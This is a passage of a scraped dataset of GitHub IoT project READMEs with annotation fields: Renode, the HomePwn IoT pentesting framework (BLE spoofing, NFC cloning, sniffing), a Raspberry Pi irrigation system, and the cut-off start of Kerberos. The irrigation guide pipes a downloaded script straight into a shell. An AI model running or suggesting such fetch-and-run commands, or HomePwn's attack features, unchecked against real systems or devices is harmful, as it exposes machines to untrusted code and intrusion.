'Additional Prerequisites' section if you wish to use Robot framework for testing. Otherwise you are ready to go to the 'Running Renode' section.\nInstalling dependencies\nMono/.NET\nRenode requires Mono >= 5.20 (Linux, macOS) or .NET >= 4.7 (Windows).\nLinux Install the mono-complete package as per the installation instructions for various Linux distributions which can be found on the Mono project website.\nmacOS On macOS, the Mono package can be downloaded directly from the Mono project website.\nWindows On Windows 7, download and install .NET Framework 4.7. Windows 10 ships with .NET by default, so no action is required there.\nOther dependencies (Linux only)\nOn Ubuntu 20.04, you can install the remaining dependencies with the following command:\nsudo apt-get install policykit-1 libgtk2.0-0 screen uml-utilities gtk-sharp2 libc6-dev gcc python3 python3-pip\nIf you are running a different distribution, you will need to install an analogous list of packages using your package manager; note that the package names may differ slightly.\nInstalling from packages\nGo to the releases section of this repository and download the appropriate package for your system.\nLinux Install Renode as normal with your preferred package manager using the provided *.deb, *.rpm or *.pkg.tar.xz packages.\nmacOS Use the provided *.dmg as normal. Additionally, to be able to use Renode from the command line on macOS, create an appropriate aliases. If you're using Bash, you can do it by adding alias renode='mono /Applications/Renode.app/Contents/MacOS/bin/Renode.exe' and alias renode-test='/Applications/Renode.app/Contents/MacOS/tests/test.sh' to your .bashrc file.\nWindows Install Renode from the provided *.msi file. The installer will allow you to add icons to your Desktop and/or Start Menu and an entry to your PATH.\nAdditional prerequisites (for Robot framework testing)\nTo write and run test cases, Renode integrates with the Robot testing framework. This requires you to install Python 3 (on Windows, you will also need Cygwin - see the advanced installation instructions) with pip (note that the relevant package may be called python-pip or python3-pip on Linux).\nOnce you have Python 3 and pip, install some additional modules:\npython3 -m pip install -r tests/requirements.txt\nBuilding from source (advanced)\nFor information on building Renode from source see the documentation.\nNightly packages\nNightly builds of Renode for all systems are available at builds.renode.io. Please note that these packages are not stable releases.\nLatest builds are always available as renode-latest.* packages.\nRunning Renode\nIf you followed the instructions on installing from a package above, you should have a system-wide renode command that you can use to run the tool:\nrenode [flags] [file]\nIf you built it from source, navigate to the relevant directory and use:\n./renode [flags] [file]\nThe optional [file] argument allows you to provide the path to a script to be run on startup.\nThe script allows several optional flags, most useful of which are presented below:\n-d debug mode (requires prior build in debug configuration) - only available when built from source\n-e COMMAND execute command on startup (does not allow the [file] argument)\n-p remove steering codes (e.g., colours) from output\n-P PORT listen on a port for monitor commands instead of opening a window\n-v prints the version number\n-h help & usage\nOn Windows systems Renode can be run by starting Renode.exe with a similar set of optional flags.\nRunning Renode in a Docker container\nIf you want to run Renode in Docker you can use a prebuilt image available on Docker Hub.\nTo start it in interactive mode on Linux, assuming you have installed Docker on your system, run:\ndocker run -ti -e DISPLAY -v $XAUTHORITY:/home/developer/.Xauthority --net=host antmicro/renode\nThis should display the Renode Monitor window. Alternatively, you can provide your custom command at the end of the above line.\nTo run the image in console mode without X server passthrough, run:\ndocker run -ti antmicro/renode bash\nTo mount your own directories, add more -v switches to the command.\nThe Docker image contains sources of Renode in the ~/renode directory. To compile and use a custom version of your choice you can run:\ncd renode\ngit fetch\ngit checkout <commit>\n./build.sh -p\nsudo apt install -y ./output/packages/renode*deb\nFor more information and the underlying Dockerfile, visit the repository on GitHub.\nDocumentation\nDocumentation is available on Read the Docs.\nLicense & contributions\nRenode is released under the permissive MIT license. For details, see the LICENSE file.\nWe\u2019re happy to accept bug reports, feature requests and contributions via GitHub pull requests / issues. For details, see the CONTRIBUTING.rst file.\nCommercial support\nCommercial support for Renode is provided by Antmicro, a company specializing in helping its clients to adopt new embedded technologies and modern development methodologies.\nAntmicro created and maintains the Renode framework and related tooling, and is happy to provide services such as adding new platforms, integrations, plugins and tools.\nTo inquire about our services, contact us at support@renode.io.", "link": "https://github.com/renode/renode", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "renode\ncopyright (c) 2010-2021 antmicro\nwhat is renode?\nrenode was created by antmicro as a virtual development -----> tool !!!  for multinode embedded networks (both wired and wireless) and is intended to enable a scalable workflow for creating effective, tested and secure iot systems.\nwith renode, developing, testing, debugging and simulating unmodified software for iot devices is fast, cost-effective and reliable.\nsupported architectures include:\narm cortex-a and cortex-m\nx86\nrisc-v\nsparc\npower\nwhy use renode?\nrenode was created based on many years of experience with the development of software for embedded systems - both for gateways, on-board computers as well as sensor nodes and microcontrollers.\ntesting and developing physical embedded systems is difficult due to poor reproducibility and lack of insight into the current state of a system, especially in multinode scenarios.\nrenode addresses this issue by letting you run unmodified binaries, identical to the ones that you would normally flash onto their target hardware, on a virtual board or system of boards.\none important aspect of the tool is that it simulates not only cpus but entire socs (including e.g. heterogeneous multicore socs and various peripherals) as well as the wired or wireless connections between them, which allows users to address complex scenarios and test real production software.\ninstallation\nusing the linux portable release\nif you are a linux user, the easiest way to use renode is to download the latest linux-portable from the releases section and unpack it using:\nmkdir renode_portable\ntar xf renode-*.linux-portable.tar.gz -c renode_portable --strip-components=1\nto use it from any location enter the created directory and add it to the system path:\ncd renode_portable\nexport path=\"`pwd`:$path\"\nfollow the 'additional prerequisites' section if you wish to use robot framework for testing. otherwise you are ready to go to the 'running renode' section.\ninstalling dependencies\nmono/.net\nrenode requires mono >= 5.20 (linux, macos) or .net >= 4.7 (windows).\nlinux install the mono-complete package as per the installation instructions for various linux distributions which can be found on the mono project website.\nmacos on macos, the mono package can be downloaded directly from the mono project website.\nwindows on windows 7, download and install .net framework 4.7. windows 10 ships with .net by default, so no action is required there.\nother dependencies (linux only)\non ubuntu 20.04, you can install the remaining dependencies with the following command:\nsudo apt-get install policykit-1 libgtk2.0-0 screen uml-utilities gtk-sharp2 libc6-dev gcc python3 python3-pip\nif you are running a different distribution, you will need to install an analogous list of packages using your package manager; note that the package names may differ slightly.\ninstalling from packages\ngo to the releases section of this repository and download the appropriate package for your system.\nlinux install renode as normal with your preferred package manager using the provided *.deb, *.rpm or *.pkg.tar.xz packages.\nmacos use the provided *.dmg as normal. additionally, to be able to use renode from the command line on macos, create an appropriate aliases. if you're using bash, you can do it by adding alias renode='mono /applications/renode.app/contents/macos/bin/renode.exe' and alias renode-test='/applications/renode.app/contents/macos/tests/test.sh' to your .bashrc file.\nwindows install renode from the provided *.msi file. the installer will allow you to add icons to your desktop and/or start menu and an entry to your path.\nadditional prerequisites (for robot framework testing)\nto write and run test cases, renode integrates with the robot testing framework. this requires you to install python 3 (on windows, you will also need cygwin - see the advanced installation instructions) with pip (note that the relevant package may be called python-pip or python3-pip on linux).\nonce you have python 3 and pip, install some additional modules:\npython3 -m pip install -r tests/requirements.txt\nbuilding from source (advanced)\nfor information on building renode from source see the documentation.\nnightly packages\nnightly builds of renode for all systems are available at builds.renode.io. please note that these packages are not stable releases.\nlatest builds are always available as renode-latest.* packages.\nrunning renode\nif you followed the instructions on installing from a package above, you should have a system-wide renode command that you can use to run the tool:\nrenode [flags] [file]\nif you built it from source, navigate to the relevant directory and use:\n./renode [flags] [file]\nthe optional [file] argument allows you to provide the path to a script to be run on startup.\nthe script allows several optional flags, most useful of which are presented below:\n-d debug mode (requires prior build in debug configuration) - only available when built from source\n-e command execute command on startup (does not allow the [file] argument)\n-p remove steering codes (e.g., colours) from output\n-p port listen on a port for monitor commands instead of opening a window\n-v prints the version number\n-h help & usage\non windows systems renode can be run by starting renode.exe with a similar set of optional flags.\nrunning renode in a docker container\nif you want to run renode in docker you can use a prebuilt image available on docker hub.\nto start it in interactive mode on linux, assuming you have installed docker on your system, run:\ndocker run -ti -e display -v $xauthority:/home/developer/.xauthority --net=host antmicro/renode\nthis should display the renode monitor window. alternatively, you can provide your custom command at the end of the above line.\nto run the image in console mode without x server passthrough, run:\ndocker run -ti antmicro/renode bash\nto mount your own directories, add more -v switches to the command.\nthe docker image contains sources of renode in the ~/renode directory. to compile and use a custom version of your choice you can run:\ncd renode\ngit fetch\ngit checkout <commit>\n./build.sh -p\nsudo apt install -y ./output/packages/renode*deb\nfor more information and the underlying dockerfile, visit the repository on github.\ndocumentation\ndocumentation is available on read the docs.\nlicense & contributions\nrenode is released under the permissive mit license. for details, see the license file.\nwe\u2019re happy to accept bug reports, feature requests and contributions via github pull requests / issues. for details, see the contributing.rst file.\ncommercial support\ncommercial support for renode is provided by antmicro, a company specializing in helping its clients to adopt new embedded technologies and modern development methodologies.\nantmicro created and maintains the renode framework and related tooling, and is happy to provide services such as adding new platforms, integrations, plugins and tools.\nto inquire about our services, contact us at support@renode.io.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000155, "year": null}, {"Unnamed: 0": 171, "autor": 171, "date": null, "content": "HomePwn - Swiss Army Knife for Pentesting of IoT Devices\n.__ __________\n| |__ ____ _____ ____\\______ \\__ _ ______\n| | \\ / _ \\ / \\_/ __ \\| ___/\\ \\/ \\/ / \\\n| Y ( <_> ) Y Y \\ ___/| | \\ / | \\\n|___| /\\____/|__|_| /\\___ >____| \\/\\_/|___| /\n\\/ \\/ \\/ \\/\n\u2620 HomePwn - IoT Pentesting & Ethical Hacking \u2620\nCreated with \u2665 by: 'Ideas Locas (CDO Telefonica)'\nHomePwn is a framework that provides features to audit and pentesting devices that company employees can use in their day-to-day work and inside the same working environment. It is designed to find devices in the home or office, take advantage of certain vulnerabilities to read or send data to those devices. With a strong library of modules you can use this tool to load new features and use them in a vast variety of devices.\nHomePwn has a modular architecture in which any user can expand the knowledge base about different technologies. Principally it has two different components:\nDiscovery modules. These modules provide functionalities related to the discovery stage, regardless of the technology to be used. For example, it can be used to conduct WiFi scans via an adapter in monitor mode, perform discovery of BLE devices, Bluetooth Low-Energy, which other devices are nearby and view their connectivity status, etc. Also, It can be used to discover a home or office IoT services using protocols such as SSDP or Simple Service Discovery Protocol and MDNS or Multicast DNS.\nSpecific modules for the technology to be audited. On the other hand, there are specific modules for audited technology. Today, HomePwn can perform auditing tests on technologies such as WiFi, NFC, or BLE. In other words, there are modules for each of these technologies in which different known vulnerabilities or different techniques are implemented to asses the device's security level implemented and communicated with this kind of technologies.\nBuilt With\nPython - Programming language used\nPrompt Toolkit - Python command line\nDocumentation\nIt's possible to read the documentation in our papers:\nSpanish Version\nEnglish Version\nGetting Started\nThese instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See deployment for notes on how to deploy the project on a live system.\nPrerequisites:\nYou need to have Linux and python 3.6+ running in your computer, please install them in the download page.\nUbuntu, Debian or similar.\nPython 3.6+.\nInstalling all requisites:\nTo install all dependencies in Ubuntu 18.04 or derivatives use the file install.sh\n> sudo apt-get update\n> cd [path to the HomePWN project]\n> sudo ./install.sh\nThe script ask you if you want to create a virtualenv, if your answer is 'y' then it installs python libraries within the virtual environment, if not in the system itself\nUsage\nTo run the script, if you chose a virtual environment in the installation follow execute the next command to activate the virtual environment:\n> source homePwn/bin/activate\nLaunch the application:\n> sudo python3 homePwn.py\nConfigure Alpha Card\nhttps://askubuntu.com/questions/1122095/install-alfa-awus036nha-driver-on-ubuntu-18-04-lts\nExamples\nHere are some videos to see how the tool works.\nHomePwn. Bluetooth Low-Energy PoC & Hacking\nHomePwn. Bluetooth Spoofing\nHomePwn. NFC Clone\nHomePwn. BLE capture on PCAP file (sniffing)\nHomePwn. QR Options hack\nHomePwn. Apple BLE Discovery\nHomePwn. Xiaomi IoT Advertisement\nAuthors\nThis project has been developed by the team of 'Ideas Locas' (CDO - Telef\u00f3nica). To contact the authors:\nideaslocas@telefonica.com\nSee also the list of CONTRIBUTORS.md who participated in this project.\nContributing\nPlease read CONTRIBUTING.md for details on our code of conduct, and the process for submitting pull requests to us.\nLicense\nThis project is licensed under the GNU General Public License - see the LICENSE.md file for details.\nDisclaimer!\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. WHENEVER YOU MAKE A CONTRIBUTION TO A REPOSITORY CONTAINING NOTICE OF A LICENSE, YOU LICENSE YOUR CONTRIBUTION UNDER THE SAME TERMS, AND YOU AGREE THAT YOU HAVE THE RIGHT TO LICENSE YOUR CONTRIBUTION UNDER THOSE TERMS. IF YOU HAVE A SEPARATE AGREEMENT TO LICENSE YOUR CONTRIBUTIONS UNDER DIFFERENT TERMS, SUCH AS A CONTRIBUTOR LICENSE AGREEMENT, THAT AGREEMENT WILL SUPERSEDE.\nThis software doesn't have a QA Process.", "link": "https://github.com/Telefonica/HomePWN", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "homepwn - swiss army knife for pentesting of iot devices\n.__ __________\n| |__ ____ _____ ____\\______ \\__ _ ______\n| | \\ / _ \\ / \\_/ __ \\| ___/\\ \\/ \\/ / \\\n| y ( <_> ) y y \\ ___/| | \\ / | \\\n|___| /\\____/|__|_| /\\___ >____| \\/\\_/|___| /\n\\/ \\/ \\/ \\/\n\u2620 homepwn - iot pentesting & ethical hacking \u2620\ncreated with \u2665 by: 'ideas locas (cdo telefonica)'\nhomepwn is a framework that provides features to audit and pentesting devices that company employees can use in their day-to-day work and inside the same working environment. it is designed to find devices in the home or office, take advantage of certain vulnerabilities to read or send data to those devices. with a strong library of modules you can use this -----> tool !!!  to load new features and use them in a vast variety of devices.\nhomepwn has a modular architecture in which any user can expand the knowledge base about different technologies. principally it has two different components:\ndiscovery modules. these modules provide functionalities related to the discovery stage, regardless of the technology to be used. for example, it can be used to conduct wifi scans via an adapter in monitor mode, perform discovery of ble devices, bluetooth low-energy, which other devices are nearby and view their connectivity status, etc. also, it can be used to discover a home or office iot services using protocols such as ssdp or simple service discovery protocol and mdns or multicast dns.\nspecific modules for the technology to be audited. on the other hand, there are specific modules for audited technology. today, homepwn can perform auditing tests on technologies such as wifi, nfc, or ble. in other words, there are modules for each of these technologies in which different known vulnerabilities or different techniques are implemented to asses the device's security level implemented and communicated with this kind of technologies.\nbuilt with\npython - programming language used\nprompt toolkit - python command line\ndocumentation\nit's possible to read the documentation in our papers:\nspanish version\nenglish version\ngetting started\nthese instructions will get you a copy of the project up and running on your local machine for development and testing purposes. see deployment for notes on how to deploy the project on a live system.\nprerequisites:\nyou need to have linux and python 3.6+ running in your computer, please install them in the download page.\nubuntu, debian or similar.\npython 3.6+.\ninstalling all requisites:\nto install all dependencies in ubuntu 18.04 or derivatives use the file install.sh\n> sudo apt-get update\n> cd [path to the homepwn project]\n> sudo ./install.sh\nthe script ask you if you want to create a virtualenv, if your answer is 'y' then it installs python libraries within the virtual environment, if not in the system itself\nusage\nto run the script, if you chose a virtual environment in the installation follow execute the next command to activate the virtual environment:\n> source homepwn/bin/activate\nlaunch the application:\n> sudo python3 homepwn.py\nconfigure alpha card\nhttps://askubuntu.com/questions/1122095/install-alfa-awus036nha-driver-on-ubuntu-18-04-lts\nexamples\nhere are some videos to see how the tool works.\nhomepwn. bluetooth low-energy poc & hacking\nhomepwn. bluetooth spoofing\nhomepwn. nfc clone\nhomepwn. ble capture on pcap file (sniffing)\nhomepwn. qr options hack\nhomepwn. apple ble discovery\nhomepwn. xiaomi iot advertisement\nauthors\nthis project has been developed by the team of 'ideas locas' (cdo - telef\u00f3nica). to contact the authors:\nideaslocas@telefonica.com\nsee also the list of contributors.md who participated in this project.\ncontributing\nplease read contributing.md for details on our code of conduct, and the process for submitting pull requests to us.\nlicense\nthis project is licensed under the gnu general public license - see the license.md file for details.\ndisclaimer!\nthe software is provided \"as is\", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. in no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software. whenever you make a contribution to a repository containing notice of a license, you license your contribution under the same terms, and you agree that you have the right to license your contribution under those terms. if you have a separate agreement to license your contributions under different terms, such as a contributor license agreement, that agreement will supersede.\nthis software doesn't have a qa process.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000171, "year": null}, {"Unnamed: 0": 185, "autor": 185, "date": null, "content": "Automated irrigation system\nThis is an open source application to water plants automatically. Up to now there is almost no free professional software and instructions available to build a DYI irrigation that is scalable, accurate and most importantly, durable. The app is also not only there to look good and for the love of data. Above all, it is a tool to tailor the sensors to the exact needs of the plants. This is where most irrigation systems with direct soil moisture measurement fail because every soil and plant is different and therefore manual calibration and possibly after some time also recalibration is essential.\nThe app contains the following features:\nMonitor and display time series data at the minute, hour, day, week and month levels\nSetting the water level from which automatic watering should be triggered.\nSetting how long the pump works during an irrigation\nManual activation of irrigation with a button\nSwitching between different sensor profiles\nSwitching between dark and light theme\nApp dark themed App light themed\nTable of contents\nPart list\nHardware Architecture\nSoftware Architecture\nSetup NodeMCU ESP8266\nSetup the Raspberry Pi with Docker (recommended)\nSetup the Raspberry Pi manually\nUsage\nContributing\nLicense\nPart list\nName Anmount Description\nCHEAP ALL IN ONE OFFER 1 - n pump, tube, capacity sensor and relay\nNodeMCU ESP8266 1 - n Wifi module for reading capacities and sending them to the backend (Raspi)\nRaspberry Pi Zero 1 Running the whole software and triggering the pump(s)\nRaspberry Pi SD Card 1 This is the data memory for the raspberry pi\nRelay 1 - n To close or open the pump circuit on signal from the raspi\nCapacitive Soil Moisture Sensors 1-n To measure the soil moisture. Capacitive sensors do not dissolve. Never use electrodical humidity sensors, as they wear out very quickly\nPump 1 - n Theoretically any pump can be used, as it is controlled by a separate power supply and the relay\nAquarium tube and irrigation nozzles - Water transfer to the plants and to distribute the water on the earth\n*all product links are also affiliate links to exactly the same products I bought for the system. If you order via the link, I will receive a tiny commission.\nThe \"n\" in the anmount is due to the number of pumps or different plants. For example, in a raised bed it is usually sufficient to have one pump and one sensor. However, if you have different potted plants, they all need to be watered separately and therefor you have to get one pump and sensor for each potted plant.\nHardware architecture\nThe architecture was chosen so that pump logic and recording of measurement data is separate. This makes it possible to control up to 26 pumps with the Raspberry Pi (amount of default available GPIO pins). It is also not possible to read the analog signals of the capacitive sensor with the Raspberry itself, because the Raspberry can only process digital signals. Surely it is possible to read the sensors with an MCP3008 and the serial interface, but this requires more pins and the setup is not as clean as it used to be. The pumps are also separately connected to a power supply, whose circuit is controlled by the relay. So it is also possible to use 12V or higher pumps.\nSoftware architecture\nFor the software architecture the MERN Stack was used. The software consists of a Node.js backend with Express.js, a Mongo database and a React frontend. A C++ script runs on the NodeMCU ESP8266, which sends data to the REST interface of the backend. The data is processed in the backend, where it is decided whether to irrigate or not. In addition, the data is then stored in the MongoDB. With the frontend, this data can also be requested from the backend via REST.\nSetup the NodeMCU ESP8266\nTo flash the NodeMCU microcontroller you have to follow the steps described in this video.\nBefore you upload the program you have to set your wifi password, wifi name (ssid), the ip of the raspberry pi (host) and the sensor name. The sensor name will be the name that is displayed in the app. So it's best to choose the name of the plant the sensor should be associated with.\nIf the Arduino IDE is successfully configured for the NodeMCU, you can upload the program you find in this repository under arduino-code/ESP8266_moisture/ESP8266_moisture.ino to the NodeMCU.\nSetup the Raspberry Pi with Docker (recommended)\nTo avoid having to install the required programs manually, you can also run the application with Docker in containers. To do this, carry out the following steps:\ncurl -sSL https://get.docker.com | sh\nsudo usermod -aG docker pi\nsudo apt-get install -y libffi-dev libssl-dev\nsudo apt-get install -y python3 python3-pip\nsudo apt-get remove python-configparser\nsudo pip3 install docker-compose\nNow you have to pass the ip address of your pi into the REACT_APP_BACKEND_URL=http://<YOUR-RASPI-IP>:3000 environment variable in the docker-compose file:\nsudo nano docker-compose.yml\nYou can find the ip with the command ifconfig. It should be something like 192.168.178.44. You can save your input in the Nano editor with ctr + x, then type in yes, finally exit with enter.\nNow everything should be ready and you can start the application with the following command:\nsudo docker-compose up\nAttention: If you have a Raspberry Pi with a processor other than ARMv7, you need to adjust the image for the mongodb in the docker-compose file. Since this is only suitable for ARMv6.\nSetup the Raspberry Pi manually\nTo set everything up we first have to burn an image to the SD card and connect to the Raspberry pi via an ssh connection. Follow this video to perform these steps.\nAfter everything has worked out, connect to the raspberry pi and take the next steps\nInstalling Node\nNode.js is an open source server environment with which we developed the backend and thus the logic for automated irrigation. The backend is the heart of the application and connects the sensor data, user interface, database and hardware (relay to the pump).\nExecute the following commands on the raspi in oder to install Node:\nwget https://nodejs.org/dist/v11.9.0/node-v11.9.0-linux-armv6l.tar.gz\ntar -xvf node-v11.9.0-linux-armv6l.tar.gz\ncd node-v11.9.0-linux-armv6l\nsudo cp -R * /usr/local/\nThat the installation has worked can be checked with the two commands for version query of Node.js and NPM:\nnode -v\nnpm -v\nInstalling MongoDB\nMongoDB is a universal, document-based, distributed noSQL database where we will store our settings and time series data.\nExecute the following commands on the raspi in oder to install MongoDB:\nsudo apt update\nsudo apt upgrade\nsudo apt install mongodb\nsudo systemctl enable mongodb\nsudo systemctl start mongodb\nThat the installation has worked can be checked with the command below:\nmongo\nInstalling the Project\nDownload the project from this repository with the following command and go in the project directory:\ngit clone https://github.com/PatrickHallek/automated-irrigation-system\ncd automated-irrigation-system\nAfter downloading the project you have to create environment files for the frontend and backend with the following commands:\nsudo nano .env\nIf you are in nano edit mode, copy the following text into it and type in your raspi ip. You can find the ip with the command ifconfig. It should be something like 192.168.178.44\nSKIP_PREFLIGHT_CHECK=true\nPORT=4200\nREACT_APP_BACKEND_URL=\"http://<YOUR-RASPI-IP>:3000\"\nYou can save your input in the Nano editor with ctr + x, then type in yes, finally exit with enter.\nWe need to do the same for the backend environment:\nsudo nano backend/.env\nCopy the following line into the editor in order to set the database connection:\nMONGO_DB=\"mongodb://localhost/irrigation\"\nIn order to install all dependencies in the frontend and backend, you need to run the following\nnpm install\ncd backend\nnpm install\nIf everything is installed, you are able to start the frontend and backend separately\nnpm run build\nnpm start &\ncd backend\nnpm start &\nUsage\nThe frontend can be accessed at the following URL if you are in your home wifi network: http://<RASPI_IP>:5000\nIn order to get the Raspberry Pi IP-address, execute ifconfig on the Raspi. If everything worked out fine, you should see the measurements in the Last Minute view in the statistics and the default preferences (which do not equal to 0).\nContributing\nPull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.\nLicense\nMIT", "link": "https://github.com/PatrickHallek/automated-irrigation-system", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "automated irrigation system\nthis is an open source application to water plants automatically. up to now there is almost no free professional software and instructions available to build a dyi irrigation that is scalable, accurate and most importantly, durable. the app is also not only there to look good and for the love of data. above all, it is a -----> tool !!!  to tailor the sensors to the exact needs of the plants. this is where most irrigation systems with direct soil moisture measurement fail because every soil and plant is different and therefore manual calibration and possibly after some time also recalibration is essential.\nthe app contains the following features:\nmonitor and display time series data at the minute, hour, day, week and month levels\nsetting the water level from which automatic watering should be triggered.\nsetting how long the pump works during an irrigation\nmanual activation of irrigation with a button\nswitching between different sensor profiles\nswitching between dark and light theme\napp dark themed app light themed\ntable of contents\npart list\nhardware architecture\nsoftware architecture\nsetup nodemcu esp8266\nsetup the raspberry pi with docker (recommended)\nsetup the raspberry pi manually\nusage\ncontributing\nlicense\npart list\nname anmount description\ncheap all in one offer 1 - n pump, tube, capacity sensor and relay\nnodemcu esp8266 1 - n wifi module for reading capacities and sending them to the backend (raspi)\nraspberry pi zero 1 running the whole software and triggering the pump(s)\nraspberry pi sd card 1 this is the data memory for the raspberry pi\nrelay 1 - n to close or open the pump circuit on signal from the raspi\ncapacitive soil moisture sensors 1-n to measure the soil moisture. capacitive sensors do not dissolve. never use electrodical humidity sensors, as they wear out very quickly\npump 1 - n theoretically any pump can be used, as it is controlled by a separate power supply and the relay\naquarium tube and irrigation nozzles - water transfer to the plants and to distribute the water on the earth\n*all product links are also affiliate links to exactly the same products i bought for the system. if you order via the link, i will receive a tiny commission.\nthe \"n\" in the anmount is due to the number of pumps or different plants. for example, in a raised bed it is usually sufficient to have one pump and one sensor. however, if you have different potted plants, they all need to be watered separately and therefor you have to get one pump and sensor for each potted plant.\nhardware architecture\nthe architecture was chosen so that pump logic and recording of measurement data is separate. this makes it possible to control up to 26 pumps with the raspberry pi (amount of default available gpio pins). it is also not possible to read the analog signals of the capacitive sensor with the raspberry itself, because the raspberry can only process digital signals. surely it is possible to read the sensors with an mcp3008 and the serial interface, but this requires more pins and the setup is not as clean as it used to be. the pumps are also separately connected to a power supply, whose circuit is controlled by the relay. so it is also possible to use 12v or higher pumps.\nsoftware architecture\nfor the software architecture the mern stack was used. the software consists of a node.js backend with express.js, a mongo database and a react frontend. a c++ script runs on the nodemcu esp8266, which sends data to the rest interface of the backend. the data is processed in the backend, where it is decided whether to irrigate or not. in addition, the data is then stored in the mongodb. with the frontend, this data can also be requested from the backend via rest.\nsetup the nodemcu esp8266\nto flash the nodemcu microcontroller you have to follow the steps described in this video.\nbefore you upload the program you have to set your wifi password, wifi name (ssid), the ip of the raspberry pi (host) and the sensor name. the sensor name will be the name that is displayed in the app. so it's best to choose the name of the plant the sensor should be associated with.\nif the arduino ide is successfully configured for the nodemcu, you can upload the program you find in this repository under arduino-code/esp8266_moisture/esp8266_moisture.ino to the nodemcu.\nsetup the raspberry pi with docker (recommended)\nto avoid having to install the required programs manually, you can also run the application with docker in containers. to do this, carry out the following steps:\ncurl -ssl https://get.docker.com | sh\nsudo usermod -ag docker pi\nsudo apt-get install -y libffi-dev libssl-dev\nsudo apt-get install -y python3 python3-pip\nsudo apt-get remove python-configparser\nsudo pip3 install docker-compose\nnow you have to pass the ip address of your pi into the react_app_backend_url=http://<your-raspi-ip>:3000 environment variable in the docker-compose file:\nsudo nano docker-compose.yml\nyou can find the ip with the command ifconfig. it should be something like 192.168.178.44. you can save your input in the nano editor with ctr + x, then type in yes, finally exit with enter.\nnow everything should be ready and you can start the application with the following command:\nsudo docker-compose up\nattention: if you have a raspberry pi with a processor other than armv7, you need to adjust the image for the mongodb in the docker-compose file. since this is only suitable for armv6.\nsetup the raspberry pi manually\nto set everything up we first have to burn an image to the sd card and connect to the raspberry pi via an ssh connection. follow this video to perform these steps.\nafter everything has worked out, connect to the raspberry pi and take the next steps\ninstalling node\nnode.js is an open source server environment with which we developed the backend and thus the logic for automated irrigation. the backend is the heart of the application and connects the sensor data, user interface, database and hardware (relay to the pump).\nexecute the following commands on the raspi in oder to install node:\nwget https://nodejs.org/dist/v11.9.0/node-v11.9.0-linux-armv6l.tar.gz\ntar -xvf node-v11.9.0-linux-armv6l.tar.gz\ncd node-v11.9.0-linux-armv6l\nsudo cp -r * /usr/local/\nthat the installation has worked can be checked with the two commands for version query of node.js and npm:\nnode -v\nnpm -v\ninstalling mongodb\nmongodb is a universal, document-based, distributed nosql database where we will store our settings and time series data.\nexecute the following commands on the raspi in oder to install mongodb:\nsudo apt update\nsudo apt upgrade\nsudo apt install mongodb\nsudo systemctl enable mongodb\nsudo systemctl start mongodb\nthat the installation has worked can be checked with the command below:\nmongo\ninstalling the project\ndownload the project from this repository with the following command and go in the project directory:\ngit clone https://github.com/patrickhallek/automated-irrigation-system\ncd automated-irrigation-system\nafter downloading the project you have to create environment files for the frontend and backend with the following commands:\nsudo nano .env\nif you are in nano edit mode, copy the following text into it and type in your raspi ip. you can find the ip with the command ifconfig. it should be something like 192.168.178.44\nskip_preflight_check=true\nport=4200\nreact_app_backend_url=\"http://<your-raspi-ip>:3000\"\nyou can save your input in the nano editor with ctr + x, then type in yes, finally exit with enter.\nwe need to do the same for the backend environment:\nsudo nano backend/.env\ncopy the following line into the editor in order to set the database connection:\nmongo_db=\"mongodb://localhost/irrigation\"\nin order to install all dependencies in the frontend and backend, you need to run the following\nnpm install\ncd backend\nnpm install\nif everything is installed, you are able to start the frontend and backend separately\nnpm run build\nnpm start &\ncd backend\nnpm start &\nusage\nthe frontend can be accessed at the following url if you are in your home wifi network: http://<raspi_ip>:5000\nin order to get the raspberry pi ip-address, execute ifconfig on the raspi. if everything worked out fine, you should see the measurements in the last minute view in the statistics and the default preferences (which do not equal to 0).\ncontributing\npull requests are welcome. for major changes, please open an issue first to discuss what you would like to change.\nlicense\nmit", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000185, "year": null}, {"Unnamed: 0": 192, "autor": 192, "date": null, "content": "Kerberos Open Source - Machinery\nLicense\nThe Kerberos Open Source project is licensed with BY-NC-SA 4.0, this means that everyone can use Kerberos and modify if to their needs, in a non commercial activity.\nMore information about this license.\nVote for features\nReport features if you think something is missing, and should be added to Kerberos Open Source, we love to hear about your ideas.\nSupported cameras\nIn this thread you can find a list of cameras that users confirmed working properly. Do you have a working camera missing from this list? Report your camera here.\nWhy Kerberos?\nAs burglary is very common, we believe that video surveillance is a trivial tool in our daily lifes which helps us to feel a little bit more secure. Responding to this need, a lot of companies have started developing their own video surveillance software in the past few years.\nNowadays we have a myriad of expensive cameras, recorders, and software solutions which are mainly outdated and difficult to install and use. Kerberos Open Source goal is to solve these problems and to provide every human being in this world to have their own ecological, affordable, easy-to-use and innovative surveillance solution.\nIntroduction\nKerberos Open Source is perfect for personal usage. It's great if you only have a couple of surveillance cameras to be managed. A Kerberos agent (e.g. on a Raspberry Pi or inside a Docker container) runs for each camera. Their are many different installation possibilities, please have a look at the architecture or installation page.\nEvery Kerberos agent has it's own web interface (front-end) to review media recording, and processing engine (back-end) of a specific surveillance camera. The Open Source version doesn't come with a central overview of all recordings generated by your Kerberos agents. For this feature we highly recommend Kerberos 